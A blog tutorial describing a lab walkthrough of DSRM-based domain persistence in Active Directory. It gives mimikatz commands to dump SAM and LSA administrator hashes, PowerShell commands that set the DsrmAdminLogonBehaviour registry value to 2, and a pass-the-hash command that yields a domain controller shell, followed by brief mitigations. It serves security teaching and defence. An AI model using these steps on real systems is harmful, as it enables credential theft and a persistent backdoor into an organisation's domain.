<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/persistence/" rel="category tag">Persistence</a></span>            </div>
            <h1 class="post-title entry-title">Domain Persistence: DSRM</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/domain-persistence-dsrm/" rel="bookmark"><time class="entry-date published" datetime="2021-04-19T13:30:38+00:00">April 19, 2021</time><time class="updated" datetime="2025-05-11T20:40:16+00:00">May 11, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this post, we are going to discuss one more Mitre Attack Technique for Tactic ID TA0003 which is used by various of APTs &amp; threat Actors for creating a permanent backdoor in the domain controller. We will check how to use Directory Services Restore Mode (DSRM) for conducting a persistence attacker on the Domain controller.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<p><strong><span style="color: #000000;">Lab Setup Requirement</span></strong></p>
<p><strong><span style="color: #000000;">What is DSRM Password</span></strong></p>
<ul>
<li><span style="color: #000000;">DSRM Persistence</span></li>
<li><span style="color: #000000;">Extract the Hashes</span></li>
<li><span style="color: #000000;">Change the DSRM Registry Key Value</span></li>
</ul>
<p><strong><span style="color: #000000;">Pass the DSRM Hash</span></strong></p>
<p><strong><span style="color: #000000;">Mitigation &amp; Workaround Solution</span></strong></p>
<h3><span style="color: #800000;">Lab Setup Requirement</span></h3>
<ul>
<li><span style="color: #000000;">1 Domain Server 2016 &amp; mimikatz</span></li>
<li><span style="color: #000000;">1 Domain client &amp; mimikatz</span></li>
</ul>
<p class="" data-start="49" data-end="316"><strong>Note: A domain controller includes two Administrator accounts. LSASS manages the “AD Administrator Account,” which administrators use to log in to the domain controller. The system stores the other, a hard-coded “Local Administrator Account,” in its SAM database.</strong></p>
<h3><span style="color: #800000;">What is DSRM Password</span></h3>
<p><span style="color: #000000;">All domain controllers have a hard-coded local Administrator account stored in their SAM file. Typically, this account and local database are not used or generally available when the domain controllers are running normally.</span></p>
<p><span style="color: #000000;">During the configuration of an Active Directory Domain Controller, the wizard prompts ask to enter a DSRM password for the local administrator. Importantly, this password provides the administrator with a back door to the database in case something goes wrong later.</span></p>
<h4><span style="color: #000000;">DSRM Persistence</span></h4>
<p><span style="color: #000000;">DSRM persistence is possible where the systems do not change the DSRM password after AD installation or do not follow the standard of changing passwords regularly for DSRM.</span></p>
<figure style="width: 757px" class="wp-caption alignnone"><img fetchpriority="high" decoding="async" src="https://1.bp.blogspot.com/-8ick8vixbS0/YH2EQe64B1I/AAAAAAAAvao/JSPa1vmSO44RBv70QAQpdC2cKamDeWCBQCLcBGAsYHQ/s16000/0.png" alt="DSRM persistence" width="757" height="552"/><figcaption class="wp-caption-text">DSRM persistence is possible where the systems do not change the DSRM password after AD installation or do not follow the standard of changing passwords regularly for DSRM.</figcaption></figure>
<h4><span style="color: #000000;"><u>At Domain Controller</u></span></h4>
<p><span style="color: #000000;">As per the cyber kill chain, persistence attack is a phase that comes after the initial foothold where an attacker will strive to create a permanent backdoor to establish a connection in the future.</span></p>
<p><span style="color: #000000;">Here, you can choose any of the methods to access the domain controller at least once, then inject the mimikatz to obtain a password hash for <strong>a local Administrator account</strong>.</span></p>
<h4><span style="color: #000000;">Extract the Hashes</span></h4>
<p><span style="color: #000000;">If you will observer the following image, you will notice that I have pulled out password hashes for <strong>Local Administration</strong> from the <strong>SAM</strong> file &amp; <strong>AD Administrator</strong> account by injecting <strong>LSA</strong> injection.</span></p>
<p><span style="color: #000000;"> All you need to do is just run the mimikatz with Administration privilege and execute these commands given below:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">privilege::debug
token::elevate</pre>
<p><span style="color: #000000;">Extract local Administrator Password Hash</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">lsadump::sam</pre>
<p><span style="color: #000000;">Extract AD Administrator Password Hash</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">lsadump::lsa /patch</pre>
<p><span style="color: #000000;"><strong>Conclusion:</strong> I have two different hashes for each administrator account but we password hash for local administrator account.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mfSqratYT5s/YH2EUuK-x2I/AAAAAAAAvas/g0euOi56cds3VO03GL7Gw_9OgyboYUSQQCLcBGAsYHQ/s16000/1.png"/></span></p>
<h4><span style="color: #000000;">Change the DSRM Registry Key Value</span></h4>
<p><span style="color: #000000;">Once you have the local administrator password hash you need to make some changes inside the Windows registry that will allow you (attacker) to login into Domain Controller using DSRM hashes without rebooting the server.</span></p>
<p><span style="color: #000000;">Very first confirm the registry key value for DsrmAdminLogonBehaviour with the help of the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"</pre>
<p><span style="color: #000000;">Here, it shows DsrmAdminLogonBehaviour Value=0 that will not allow login into DC using DSRM hash.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-eEj_ifyGJis/YH2EapIdVNI/AAAAAAAAvaw/ouKqat1zJ_IKeV-H6W4ybXWCRW09PZqCACLcBGAsYHQ/s16000/4.png" alt="DSRM persistence" width="756" height="426"/></span></p>
<p><span style="color: #000000;">Next, Set DsrmAdminLogonBehaviour <strong>value=2</strong> with the help of the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-x_6m-F93yb4/YH2EfR8wkUI/AAAAAAAAva0/--PpMlQgD0wv-jpqKnGhBpX13XxSbrrwQCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;"><strong>Note:</strong> <em>If DsrmAdminLogonBehaviou registry key is not present inside the HKLM:\System\CurrentControlSet\Control\Lsa\ then create a new key and set the value with the help of the following command:</em></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose</pre>
<p><span style="color: #000000;"><strong>Conclusion:</strong> The DSRM persistence is now ready for use.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-cJknhi797bc/YH2En1JCN4I/AAAAAAAAvbE/DD5O9oURHLkxHhjFblIayUPoMi7pZRKSACLcBGAsYHQ/s16000/8.png" alt="DSRM" width="748" height="497"/></span></p>
<h3><span style="color: #800000;">Pass the DSRM Hash</span></h3>
<h4><span style="color: #000000;"><u>At Client System</u></span></h4>
<p><span style="color: #000000;">To access the domain controller CMD through the client system, run mimikatz with administrator privilege and execute the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">privilege::debug
sekurlsa::pth /user:Administrator /domain:ignite.local /ntlm:32196B56FFE6F45E294117B91A83BF38</pre>
<p><span style="color: #000000;"><strong>Note: Use the hash value of the local Administrator in the above command </strong></span></p>
<p><span style="color: #000000;">Finally, this will provide you (attacker) the Administrator privilege cmd shell of the Domain controller 😊</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-AH4Qkoa1Y1A/YH2Ej8_VRQI/AAAAAAAAva8/Q5U7eUxjluYCAygW5ArV7-AP4UaKiEMBgCLcBGAsYHQ/s16000/7.png"/></p>
<h3><span style="color: #800000;">Mitigation &amp; Workaround Solution</span></h3>
<ul>
<li><span style="color: #000000;">Check &amp; monitor the DsrmAdminLogonBehaviour value is not set to 2 inside the Registry key.</span></li>
<li><span style="color: #000000;">DSRM passwords are changed regularly at least once a month.</span></li>
</ul>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> <span style="color: #0000ff;">here</span></a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
